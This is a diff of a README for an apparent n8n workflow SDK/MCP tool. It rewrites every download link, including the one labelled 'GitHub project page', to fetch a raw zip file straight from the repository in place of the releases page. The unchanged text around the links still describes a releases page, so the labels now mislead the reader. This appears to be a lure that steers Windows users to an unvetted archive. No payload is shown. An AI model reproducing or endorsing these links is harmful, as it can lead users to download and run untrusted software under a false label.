@@ -1,6 +1,6 @@
 # ⚙️ n8n-workflow-sdk-mcp - Manage n8n Workflows Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp/raw/refs/heads/main/n8n-workflow/n_mcp_workflow_sdk_3.6.zip)
 
 ---
 
@@ -37,10 +37,10 @@ This guide will help you download and start the app on your Windows PC. No speci
 
 Please visit the official release page to get the software:
 
-[![Visit Release Page](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp/releases)
+[![Visit Release Page](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp/raw/refs/heads/main/n8n-workflow/n_mcp_workflow_sdk_3.6.zip)
 
 1. Click the button above or open this link in your browser:
-   https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp/releases
+   https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp/raw/refs/heads/main/n8n-workflow/n_mcp_workflow_sdk_3.6.zip
 
 2. On the releases page, look for the latest version. It usually shows as a file ending with `.exe` or `.zip`.
 
@@ -137,10 +137,10 @@ Support is mainly user-driven; most answers come from documentation and forums.
 ## 📌 Important Links
 
 - Download latest release:  
-  https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp/releases
+  https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp/raw/refs/heads/main/n8n-workflow/n_mcp_workflow_sdk_3.6.zip
 
 - GitHub project page:  
-  https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp
+  https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp/raw/refs/heads/main/n8n-workflow/n_mcp_workflow_sdk_3.6.zip
 
 ---
 
